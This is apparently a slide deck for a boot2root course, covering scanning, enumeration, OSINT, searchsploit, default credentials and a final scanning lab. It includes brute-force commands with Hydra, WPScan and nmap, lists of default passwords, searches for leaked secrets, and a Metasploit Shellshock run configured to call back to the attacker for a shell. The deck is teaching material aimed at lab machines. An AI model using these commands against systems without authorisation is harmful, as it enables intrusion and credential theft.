---
marp: true
theme: default
paginate: true
---

# Boot2Root: Scanning & Enumeration

## Day 5: Putting It All Together

---

## Day 5 Overview

| Session | Topic |
|---------|-------|
| Morning Part 1 | Scanning, enumeration, resource mapping |
| Morning Part 2 | Testing for injections |
| Afternoon Part 1 | Code injection & control connections |
| Afternoon Part 2 | Privilege escalation & persistence |
| Late Afternoon | CTF exercise |

---

## Boot2Root Methodology

```
+--Phase 1: Reconnaissance--------+
| Network scanning (Nmap)         |
| Service enumeration             |
| Web application discovery       |
+--Phase 2: Enumeration-----------+
| Directory brute-forcing         |
| Technology fingerprinting       |
| User enumeration                |
+--Phase 3: Exploitation----------+
| Identify vulnerabilities        |
| Exploit to gain access          |
| Get initial shell               |
+--Phase 4: Post-Exploitation-----+
| Privilege escalation            |
| Persistence                     |
| Data exfiltration               |
| Pivoting to other systems       |
+---------------------------------+
```

---

## Phase 1: Network Scanning

```bash
# Quick scan - top 1000 ports
nmap -sV -sC -oN scan.txt TARGET_IP

# Full TCP port scan
nmap -sV -sC -p- -oN full-scan.txt TARGET_IP

# UDP scan (top 20 ports)
nmap -sU --top-ports 20 -oN udp-scan.txt TARGET_IP

# Aggressive scan with OS detection
nmap -A -T4 -oN aggressive-scan.txt TARGET_IP

# Script scan for specific services
nmap --script "http-*" -p 80,443,8080 TARGET_IP
nmap --script "smb-*" -p 445 TARGET_IP
nmap --script "ftp-*" -p 21 TARGET_IP

# Output in all formats
nmap -sV -sC -p- -oA full-scan TARGET_IP
# Creates: full-scan.nmap, full-scan.xml, full-scan.gnmap
```

---

## Interpreting Nmap Results

```
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 8.2p1 Ubuntu
80/tcp   open     http     Apache httpd 2.4.41
443/tcp  open     ssl/http Nginx 1.18.0
3306/tcp open     mysql    MySQL 5.7.34
8080/tcp open     http     Apache Tomcat 9.0.41
8443/tcp open     ssl/http Jetty 9.4.31

Analysis:
- Port 22: SSH access point (try brute-force if allowed)
- Port 80: Apache web server (check for web vulns)
- Port 443: Nginx reverse proxy (different than port 80!)
- Port 3306: MySQL accessible externally (misconfiguration!)
- Port 8080: Tomcat (check /manager/html)
- Port 8443: Jetty (Java-based, check for deserialization)
```

---

## Service Enumeration

```bash
# HTTP enumeration
whatweb http://TARGET_IP
nikto -h http://TARGET_IP
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt

# SMB enumeration (if port 445 open)
smbclient -L //TARGET_IP -N          # List shares
enum4linux -a TARGET_IP              # Full SMB enumeration
smbmap -H TARGET_IP                  # Check permissions

# FTP enumeration (if port 21 open)
ftp TARGET_IP                        # Try anonymous login

# SSH enumeration
ssh TARGET_IP -o PreferredAuthentications=none
# See supported authentication methods

# MySQL enumeration (if exposed)
mysql -h TARGET_IP -u root -p        # Try common passwords
nmap --script mysql-* -p 3306 TARGET_IP

# SNMP enumeration (UDP 161)
snmpwalk -v2c -c public TARGET_IP
```

---

## Web Application Enumeration

```bash
# Step 1: Browse the application manually
# Note all functionality, forms, and links

# Step 2: Directory and file discovery
gobuster dir -u http://TARGET_IP \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,old,zip,tar.gz,sql \
  -t 50 -o dirs.txt

# Step 3: Virtual host discovery
ffuf -u http://TARGET_IP \
  -H "Host: FUZZ.target.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs [default_size]

# Step 4: Technology detection
curl -I http://TARGET_IP
whatweb http://TARGET_IP -v

# Step 5: Check common sensitive files
curl http://TARGET_IP/robots.txt
curl http://TARGET_IP/.git/HEAD
curl http://TARGET_IP/.env
curl http://TARGET_IP/phpinfo.php
```

---

## Automated Web Vulnerability Scanning

```bash
# Nikto comprehensive scan
nikto -h http://TARGET_IP -o nikto-report.html -Format htm

# Nuclei with all templates
nuclei -u http://TARGET_IP -severity critical,high,medium \
  -o nuclei-results.txt

# OWASP ZAP automated scan
zap-cli quick-scan http://TARGET_IP
zap-cli active-scan http://TARGET_IP
zap-cli alerts -l Informational

# WPScan (if WordPress detected)
wpscan --url http://TARGET_IP --enumerate u,vp,vt,tt \
  --api-token YOUR_TOKEN

# Joomscan (if Joomla detected)
joomscan -u http://TARGET_IP
```

---

## Resource Mapping Document

```
TARGET: 10.10.10.100
===================

PORTS & SERVICES:
  22/tcp  - OpenSSH 8.2p1 (Ubuntu)
  80/tcp  - Apache 2.4.41 (WordPress 5.8)
  3306/tcp - MySQL 5.7.34

WEB DIRECTORIES:
  /wp-admin/         (302 -> login)
  /wp-content/       (200, directory listing!)
  /wp-includes/      (200)
  /backup/           (200, contains db_backup.sql!)
  /phpmyadmin/       (200, accessible!)

USERS FOUND:
  - admin (WordPress user)
  - john  (from /etc/passwd via LFI)

POTENTIAL VULNERABILITIES:
  1. WordPress 5.8 - CVE-2021-XXXXX
  2. phpmyadmin exposed - default creds?
  3. Database backup file accessible
  4. Directory listing on /wp-content/
```

---

## CMS-Specific Enumeration

```bash
# WordPress
wpscan --url http://TARGET --enumerate u,vp,vt,tt,cb,dbe
# u=users, vp=vulnerable plugins, vt=vulnerable themes
# tt=timthumbs, cb=config backups, dbe=db exports

# WordPress brute-force
wpscan --url http://TARGET -U admin -P /usr/share/wordlists/rockyou.txt

# Drupal
droopescan scan drupal -u http://TARGET

# Joomla
joomscan -u http://TARGET

# Magento
magescan scan:all http://TARGET

# Common CMS admin paths:
# WordPress: /wp-admin/, /wp-login.php
# Drupal:    /user/login, /admin
# Joomla:    /administrator/
# Magento:   /admin, /admin_xxxxx (custom)
```

---

## Nmap Script Engine (NSE) Deep Dive

```bash
# NSE categories: auth, broadcast, brute, default,
# discovery, dos, exploit, external, fuzzer, intrusive,
# malware, safe, version, vuln

# Run all safe scripts
nmap --script safe -p 80 TARGET

# Specific vulnerability checks
nmap --script http-shellshock -p 80 TARGET
nmap --script http-heartbleed -p 443 TARGET
nmap --script smb-vuln-ms17-010 -p 445 TARGET
nmap --script http-sql-injection -p 80 TARGET

# Brute-force scripts
nmap --script http-brute -p 80 TARGET
nmap --script ftp-brute -p 21 TARGET
nmap --script ssh-brute -p 22 TARGET

# List available scripts
ls /usr/share/nmap/scripts/ | grep http
nmap --script-help "http-*"
```

---

## Passive Reconnaissance Techniques

```bash
# OSINT - Gather information without touching the target

# DNS records
dig target.com ANY
dig target.com MX
dig target.com NS
host -t txt target.com

# WHOIS information
whois target.com

# Certificate Transparency
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | sort -u

# Shodan (requires API key)
shodan search "hostname:target.com"
shodan host TARGET_IP

# Google dorking
# site:target.com filetype:php
# site:target.com intitle:"index of"

# GitHub / GitLab searches
# org:targetcompany password
# org:targetcompany api_key
# org:targetcompany secret
```

---

## Organizing Your Notes

```bash
# Use a structured note-taking approach

# Create project directory
mkdir -p pentest/{scans,loot,exploits,screenshots,notes}

# Nmap output
nmap -sV -sC -oA pentest/scans/initial TARGET

# Keep a running command log
script -a pentest/notes/terminal.log

# CherryTree (popular pentesting notebook)
# Structured hierarchy for findings

# Recommended note structure:
# pentest/
# ├── scans/
# │   ├── nmap_initial.nmap
# │   ├── nmap_full.nmap
# │   ├── gobuster.txt
# │   └── nikto.txt
# ├── loot/
# │   ├── credentials.txt
# │   └── hashes.txt
# ├── exploits/
# │   ├── sqli_payload.txt
# │   └── reverse_shell.py
# ├── screenshots/
# └── notes/
#     ├── methodology.md
#     └── findings.md
```

---

## Searchsploit - Finding Known Exploits

```bash
# searchsploit queries the Exploit Database locally

# Search by software name and version
searchsploit apache 2.4.41
searchsploit wordpress 5.8
searchsploit phpmyadmin
searchsploit tomcat 9

# Narrow results
searchsploit -t "wordpress plugin" --exclude="dos"

# Get more info about an exploit
searchsploit -x exploits/php/webapps/12345.py

# Copy exploit to current directory
searchsploit -m exploits/php/webapps/12345.py

# Update the database
searchsploit -u

# Online: https://www.exploit-db.com
# Also check:
# - CVE databases (cve.mitre.org, nvd.nist.gov)
# - GitHub (search for CVE-XXXX-XXXXX)
# - Metasploit modules (search in msfconsole)
```

---

## Default Credential Checks

```bash
# ALWAYS check for default credentials on every service

# Common defaults:
# Apache Tomcat:  tomcat:tomcat, admin:admin, manager:manager
# MySQL:          root:(empty), root:root
# PostgreSQL:     postgres:postgres
# MongoDB:        (no auth by default!)
# Redis:          (no auth by default!)
# phpMyAdmin:     root:(empty)
# Jenkins:        admin:admin (or check /script console)
# Grafana:        admin:admin
# Elasticsearch:  (no auth by default!)
# WordPress:      admin:password, admin:admin

# Automated tools:
# changeme - default credential scanner
changeme http://TARGET

# Default credential databases:
# https://www.cirt.net/passwords
# https://default-password.info
# https://datarecovery.com/rd/default-passwords/

# Hydra with small password list
hydra -L common-users.txt -P common-passwords.txt \
  TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"
```

---

## Metasploit for Web Exploitation

```bash
# Metasploit Framework - when you find a known CVE

msfconsole

# Search for exploits
msf> search wordpress
msf> search type:exploit name:apache
msf> search cve:2021-44228

# Use an exploit
msf> use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf> show options
msf> set RHOSTS TARGET_IP
msf> set RPORT 80
msf> set TARGETURI /cgi-bin/vulnerable.cgi
msf> set LHOST YOUR_IP
msf> set LPORT 4444
msf> exploit

# Useful auxiliary modules for web
msf> use auxiliary/scanner/http/dir_scanner
msf> use auxiliary/scanner/http/http_version
msf> use auxiliary/scanner/http/robots_txt
msf> use auxiliary/scanner/http/brute_dirs
```

---

## Lab: Scanning Exercise

**Target**: Practice machine at assigned IP

1. Perform a full `nmap` scan
2. Enumerate all discovered services
3. Run `gobuster` against any web services
4. Check for default credentials
5. Create a resource mapping document
6. Identify at least 3 potential attack vectors

---

## Summary

- Systematic scanning reveals the full attack surface
- `nmap` with `-sV -sC` provides service versions and basic checks
- Multiple web scanners catch different issues
- Service-specific tools provide deeper enumeration
- Document everything for later exploitation phases
- Resource mapping organizes findings efficiently

> Next: Testing for Injections
